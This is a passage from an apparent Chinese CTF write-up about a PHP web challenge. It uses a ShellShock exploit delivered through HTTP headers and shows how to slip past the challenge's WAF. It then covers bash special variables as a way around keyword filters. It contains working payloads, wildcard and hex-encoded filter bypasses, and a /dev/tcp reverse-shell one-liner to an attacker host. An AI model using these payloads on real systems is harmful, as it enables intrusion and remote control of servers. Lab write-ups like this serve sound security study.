&lt;?php foreach($pages as list($file, $title)): ?&gt;
        &lt;li class=&quot;nav-item&quot;&gt;
          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;
        &lt;/li&gt;
&lt;?php endforeach; ?&gt;
      &lt;/ul&gt;
    &lt;/nav&gt;

    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable('render')) render(); else render_default(); ?&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;

</code></pre><p><code>man.php</code>源码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
    <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;man&#39;</span><span class=p>;</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nv>$file</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[\w\-]+$/&#39;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>)</span> <span class=o>!==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#39;</span><span class=p>;</span>
            <span class=k>return</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span>

    <span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Online documents&lt;/h1&gt;&#39;</span><span class=p>;</span>

    <span class=nv>$cmds</span> <span class=o>=</span> <span class=p>[</span>
        <span class=s1>&#39;bash&#39;</span><span class=p>,</span> <span class=s1>&#39;ls&#39;</span><span class=p>,</span> <span class=s1>&#39;cp&#39;</span><span class=p>,</span> <span class=s1>&#39;mv&#39;</span>
    <span class=p>];</span>

    <span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>
    <span class=k>foreach</span><span class=p>(</span><span class=nv>$cmds</span> <span class=k>as</span> <span class=nv>$cmd</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=man&amp;file=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>

    <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;h2&gt;$ man %s&lt;/h2&gt;&#39;</span><span class=p>,</span> <span class=nx>htmlentities</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>

    <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
    <span class=nx>execute</span><span class=p>(</span><span class=nx>sprintf</span><span class=p>(</span><span class=s1>&#39;man %s | cat&#39;</span><span class=p>,</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>)));</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
<span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p><code>untar.php</code>源码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;h1&gt;Tar file tester&lt;/h1&gt;
</span><span class=err>
</span><span class=err>&lt;p&gt;Please upload a tar file to test&lt;/p&gt;
</span><span class=err>
</span><span class=err>&lt;form enctype=&#34;multipart/form-data&#34; action=&#34;index.php?func=untar&#34; method=&#34;POST&#34;&gt;
</span><span class=err>  &lt;input type=&#34;file&#34; name=&#34;tarfile&#34; id=&#34;tarfile&#34;&gt;
</span><span class=err>  &lt;input class=&#34;btn btn-primary&#34; type=&#34;submit&#34; value=&#34;Upload &amp;amp; Test&#34;&gt;
</span><span class=err>&lt;/form&gt;
</span><span class=err>
</span><span class=err>&lt;?php
</span><span class=err>
</span><span class=err>    if(isset($_FILES[&#39;tarfile&#39;])) {
</span><span class=err>        printf(&#39;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#39;, htmlentities($_FILES[&#39;tarfile&#39;][&#39;name&#39;]));
</span><span class=err>
</span><span class=err>        echo &#39;&lt;pre&gt;&#39;;
</span><span class=err>        execute(sprintf(&#39;tar -tvf %s 2&gt;&amp;1&#39;, escapeshellarg($_FILES[&#39;tarfile&#39;][&#39;tmp_name&#39;])));
</span><span class=err>        echo &#39;&lt;/pre&gt;&#39;;
</span><span class=err>    }
</span><span class=err>}
</span><span class=err>?&gt;
</span></code></pre></div><p><code>ls.php</code>源码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
    <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;.&#39;</span><span class=p>;</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nv>$file</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
    <span class=p>}</span>

    <span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#39;</span><span class=p>;</span>

    <span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>
    <span class=nv>$dirs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;..&#39;</span><span class=p>,</span> <span class=s1>&#39;../..&#39;</span><span class=p>,</span> <span class=s1>&#39;/etc/passwd&#39;</span><span class=p>];</span>
    <span class=k>foreach</span><span class=p>(</span><span class=nv>$dirs</span> <span class=k>as</span> <span class=nv>$dir</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=ls&amp;file=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;</span><span class=p>,</span> <span class=nv>$dir</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>

    <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#39;</span><span class=p>,</span> <span class=nx>htmlentities</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>

    <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
    <span class=nx>execute</span><span class=p>(</span><span class=nx>sprintf</span><span class=p>(</span><span class=s1>&#39;ls -l %s&#39;</span><span class=p>,</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>)));</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
<span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p><code>cmd.php</code>源码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
    <span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nv>$cmd</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>];</span>
    <span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;h1&gt;Command Execution&lt;/h1&gt;
</span><span class=err>&lt;?php
</span><span class=err>    echo &#39;&lt;ul&gt;&#39;;
</span><span class=err>    $cmds = [&#39;ls&#39;, &#39;env&#39;];
</span><span class=err>    foreach($cmds as $c) {
</span><span class=err>        printf(&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=cmd&amp;cmd=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;, $c);
</span><span class=err>    }
</span><span class=err>    echo &#39;&lt;/ul&gt;&#39;;
</span><span class=err>?&gt;
</span><span class=err>
</span><span class=err>&lt;form action=&#34;index.php&#34; method=&#34;GET&#34;&gt;
</span><span class=err>  &lt;input type=&#34;hidden&#34; name=&#34;func&#34; value=&#34;cmd&#34;&gt;
</span><span class=err>  &lt;div class=&#34;input-group&#34;&gt;
</span><span class=err>    &lt;input class=&#34;form-control&#34; type=&#34;text&#34; name=&#34;cmd&#34; id=&#34;cmd&#34;&gt;
</span><span class=err>    &lt;div class=&#34;input-group-append&#34;&gt;
</span><span class=err>      &lt;input class=&#34;btn btn-primary&#34; type=&#34;submit&#34; value=&#34;Execute&#34;&gt;
</span><span class=err>    &lt;/div&gt;
</span><span class=err>  &lt;/div&gt;
</span><span class=err>&lt;/form&gt;
</span><span class=err>&lt;script&gt;cmd.focus();&lt;/script&gt;
</span><span class=err>&lt;?php
</span><span class=err>
</span><span class=err>    if(strlen($cmd) &gt; 0) {
</span><span class=err>        printf(&#39;&lt;h2&gt;$ %s&lt;/h2&gt;&#39;, htmlentities($cmd));
</span><span class=err>
</span><span class=err>        echo &#39;&lt;pre&gt;&#39;;
</span><span class=err>        switch ($cmd) {
</span><span class=err>        case &#39;env&#39;:
</span><span class=err>        case &#39;ls&#39;:
</span><span class=err>        case &#39;ls -l&#39;:
</span><span class=err>        case &#39;ls -al&#39;:
</span><span class=err>            execute($cmd);
</span><span class=err>            break;
</span><span class=err>        case &#39;cat flag&#39;:
</span><span class=err>            echo &#39;&lt;img src=&#34;cat-flag.png&#34; alt=&#34;cat flag&#34;&gt;&#39;;
</span><span class=err>            break;
</span><span class=err>        default:
</span><span class=err>            printf(&#39;%s: command not found&#39;, htmlentities($cmd));
</span><span class=err>        }
</span><span class=err>        echo &#39;&lt;/pre&gt;&#39;;
</span><span class=err>    }
</span><span class=err>}
</span><span class=err>?&gt;
</span></code></pre></div><p>接下来我们就可以利用<code>ls.php</code>来找<code>flag</code>了，因为<code>ls.php</code>没什么过滤，所以用<code>func=ls&file=../../../</code>可以发现根目录下的文件</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg loading=lazy>
</a>
</figure></p>
<p>接下来就是考虑怎么去读了，<code>man.php</code>因为有<code>preg_match('/^[\w\-]+$/', $file) !== 1</code>限制得比较死，<code>untar.php</code>貌似只有<code>tar -tvf</code>并没有什么用处，只有<code>cmd.php</code>给出了一个比较不太寻常的<code>env</code>这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到<code>ShellShock</code>漏洞，并且在<code>index.php</code>中发现有</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$black_list</span> <span class=o>=</span> <span class=p>[</span>
    <span class=s1>&#39;\/flag&#39;</span><span class=p>,</span> <span class=s1>&#39;\(\)\s*\{\s*:;\s*\};&#39;</span>
<span class=p>];</span>

<span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>global</span> <span class=nv>$black_list</span><span class=p>;</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$a</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>foreach</span><span class=p>(</span><span class=nv>$a</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>waf</span><span class=p>(</span><span class=nv>$key</span><span class=p>);</span>
            <span class=nx>waf</span><span class=p>(</span><span class=nv>$val</span><span class=p>);</span>
        <span class=p>}</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>foreach</span><span class=p>(</span><span class=nv>$black_list</span> <span class=k>as</span> <span class=nv>$b</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>$b</span><span class=s2>/&#34;</span><span class=p>,</span> <span class=nv>$a</span><span class=p>)</span> <span class=o>===</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
                <span class=nx>fuck</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$b</span><span class=s2> detected! exit now.&#34;</span><span class=p>);</span>
            <span class=p>}</span>
        <span class=p>}</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=nx>waf</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>);</span>
<span class=nx>waf</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>);</span>
<span class=nx>waf</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>

<span class=k>foreach</span><span class=p>(</span><span class=nv>$_SERVER</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>===</span> <span class=s1>&#39;HTTP_&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$key</span><span class=s2>=</span><span class=si>$val</span><span class=s2>&#34;</span><span class=p>);</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>关键就在<code>putenv</code>函数，由于<code>ShellShock</code>漏洞 padyload 需要参数</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>env <span class=nv>x</span><span class=o>=</span><span class=s1>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class=s2>&#34;echo this is a test&#34;</span> 
</code></pre></div><p>我们就可以利用<code>putenv</code>实现参数传递，直接设置<code>User-agent: () { :;}; echo 222222</code>，发现被 waf</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg loading=lazy>
</a>
</figure></p>
<p>分析 waf 结合漏洞成因，我们可以在最后的<code>};</code>中间添加一个空格绕过，设置<code>User-Agent: () { :;} ; echo 222222</code>，成功发现输出 22222 ，我们也可以使用<code>() { _; } >_[$($())] { whoami; }</code>这个 payload</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg loading=lazy>
</a>
</figure></p>
<p>发现当前用户为<code>www-data</code>，而我们之前发现根目录<code>flag</code>的权限为<code>-r-------- 1 flag root 37 Jan 9 2018 flag</code>，所以不能直接读取，但是有一个<code>flag-reader</code>与<code>flag-reader.c</code>的文件，这应该是题目提示了。因为<code>index.php</code>又把<code>flag</code>关键字屏蔽了，我们也不能直接读取<code>flag-reader.c</code>，但是我们这里可以利用通配符读取，例如使用<code>fla*.c</code></p>
<p>使用<code>() { _; } >_[$($())] { cat /fla*.c; }</code>得到<code>flag-reader.c</code>源码</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg loading=lazy>
</a>
</figure></p>
<p>Flag-reader.c:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;syscall.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
<span class=p>{</span>
	<span class=kt>char</span> <span class=n>buff</span><span class=p>[</span><span class=mi>4096</span><span class=p>],</span> <span class=n>rnd</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>val</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
	<span class=k>if</span><span class=p>(</span><span class=n>syscall</span><span class=p>(</span><span class=n>SYS_getrandom</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rnd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>))</span> <span class=p>{</span>
		<span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Not enough random</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
	<span class=p>}</span>

	<span class=n>setuid</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
	<span class=n>seteuid</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
	<span class=n>alarm</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
	<span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rnd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>));</span>
	<span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>val</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>val</span><span class=p>));</span>

	<span class=k>if</span><span class=p>(</span><span class=n>memcmp</span><span class=p>(</span><span class=n>rnd</span><span class=p>,</span> <span class=n>val</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
		<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>);</span>
		<span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
			<span class=kt>int</span> <span class=n>s</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=mi>1024</span><span class=p>);</span>
			<span class=k>if</span><span class=p>(</span><span class=n>s</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
				<span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
			<span class=p>}</span>
			<span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
			<span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Can not open file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
		<span class=p>}</span>
	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
		<span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Wrong response</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
	<span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>使用<code>bash -c "sh >& /dev/tcp/your ip/port 0>&1" </code>直接反弹 shell</p>
<p>运行<code>flag-reader</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg loading=lazy>
</a>
</figure></p>
<p>审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就<code>write(1, "Wrong response\n", 16);</code>&mldr;</p>
<p>然而我在回弹 shell 之后，利用<code>/tmp</code>可写的权限，貌似有点小问题，一旦<code>cat /tmp/zedd</code>，链接就断掉了，无奈只能找其他文件夹，发现<code>/run/lock</code>与<code>/var/tmp</code>均可读可写，使用<code>/flag-reader flag > /run/lock/zedd &lt; /run/lock/zedd</code>写入 flag</p>
<p>反弹 shell 使用<code>cat</code>非常容易断掉，最好使用执行的方式，最后得到 flag</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg loading=lazy>
</a>
</figure></p>
<h2 id=上篇的解释与补充>上篇的解释与补充</h2>
<h3 id=特殊变量>特殊变量</h3>
<p>这里再对上篇进行一定的补充与解释。</p>
<h4 id=n>$n</h4>
<table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>$0</td>
<td>当前脚本的文件名</td>
</tr>
<tr>
<td>$n</td>
<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第二个参数是$2(0&lt;n&lt;9)</td>
</tr>
<tr>
<td>${n}</td>
<td>9&lt;n时需要加上大括号</td>
</tr>
</tbody>
</table>
<p>例如，脚本文件如下</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=nb>echo</span> <span class=s2>&#34;File Name: </span><span class=nv>$0</span><span class=s2>&#34;</span>
<span class=nb>echo</span> <span class=s2>&#34;First Parameter : </span><span class=nv>$1</span><span class=s2>&#34;</span>
<span class=nb>echo</span> <span class=s2>&#34;First Parameter : </span><span class=nv>$2</span><span class=s2>&#34;</span>
</code></pre></div><p>执行脚本文件</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./test.sh Hello Zedd
File Name: ./test.sh
First Parameter : Hello
Second Parameter : Zedd
</code></pre></div><p>而当没有参数的时候，<code>$n</code>就为空，所以我们可以用<code>cat /fl$1ag</code>这样绕过关键字过滤，并且在 bash 环境下</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$0</span>
bash
</code></pre></div><p>所以我们可以使用这样的 payload ，可以用在 bash 这个关键字过滤但是有需要用到 bash 的情况下，前提是环境用的是 bash</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=o>{</span>printf,<span class=s2>&#34;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&#34;</span><span class=o>}</span><span class=p>|</span><span class=nv>$0</span>
flag<span class=o>{</span>xxx<span class=o>}</span>
</code></pre></div><h4 id=ifs>$IFS</h4>
<p>IFS(Internal Field Seprator) ，内部域分隔符，Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
<p>而 IFS 是一种 set 变量，当 shell 处理"命令替换"和"参数替换"时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$IFS</span>

$ <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$IFS</span><span class=s2>&#34;</span> <span class=p>|</span> od -b
<span class=m>0000000</span> <span class=m>040</span> <span class=m>011</span> <span class=m>012</span> <span class=m>012</span>
<span class=m>0000004</span>
</code></pre></div><p>我们可以看到直接输出IFS是看不到的，把它转化为二进制就可以看到了，&ldquo;040"是空格，&ldquo;011"是Tab，&ldquo;012"是换行符&rdquo;\n&rdquo; 。最后一个 012 是因为 echo 默认是会换行的。</p>
<h4 id=heading>$?</h4>
<p>上个命令的退出状态，或函数的返回值。退出状态是一个数字，一般情况下，大部分命令执行成功会返回0，失败返回1。不过，也有一些命令返回其他值，表示不同类型的错误。</p>
<h4 id=heading-1>$</h4>
<p>当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$$</span>
<span class=m>75576</span>
</code></pre></div><h4 id=heading-2>$#</h4>
<p>传递给脚本或函数的参数个数。</p>
<p>脚本文件内容：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=nb>echo</span> <span class=s2>&#34;Total Number of Parameters : </span><span class=nv>$#</span><span class=s2>&#34;</span>
</code></pre></div><p>执行命令</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./test.sh Hello Zedd
Total Number of Parameters : <span class=m>2</span>
</code></pre></div><h4 id=与>$*与$@</h4>
<p>都是传递给脚本或函数的所有参数。</p>
<p>脚本文件内容：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=nb>echo</span> <span class=s2>&#34;Quoted Values: </span><span class=nv>$@</span><span class=s2>&#34;</span>
<span class=nb>echo</span> <span class=s2>&#34;Quoted Values: </span><span class=nv>$*</span><span class=s2>&#34;</span>
</code></pre></div><p>执行命令：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./test.sh Hello Zedd
Quoted Values: Hello Zedd
Quoted Values: Hello Zedd
</code></pre></div><p>它们不被双引号(&rdquo; &ldquo;)包含时，都以"1"&ldquo;2&rdquo; … &ldquo;$n&rdquo; 的形式输出所有参数。</p>
<p>但是当它们被双引号(&rdquo; &ldquo;)包含时，&ldquo;∗"会将所有的参数作为一个整体，以"1 2…n"的形式输出所有参数；"@&ldquo;会将各个参数分开，以"1&rdquo; &ldquo;2&rdquo;…&ldquo;n&rdquo; 的形式输出所有参数。</p>
<h3 id=内置变量绕过>内置变量绕过</h3>
<p>上篇其实提到了一点<a class=link href=https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87 target=_blank rel=noopener>内置变量绕过</a>，但是讲的也不并不多，只是大概提了一下。这里再给一些常用的 bash 内置的环境变量</p>
<h4 id=bash>$BASH</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$BASH</span>
/usr/local/bin/bash
</code></pre></div><p>返回 bash 二进制文件的路径</p>
<h4 id=home>$HOME</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nv>$HOME</span>
bash: /Users/zedd: Is a directory
</code></pre></div><p>返回当前用户所属目录</p>
<h4 id=pwd>$PWD</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$PWD</span>
/
</code></pre></div><p>显示当前目录</p>
<h4 id=oldpwd>$OLDPWD</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$OLDPWD</span>
/Users/zedd/Desktop/
</code></pre></div><p>返回上次所在目录</p>
<h4 id=path>$PATH</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$PATH</span>
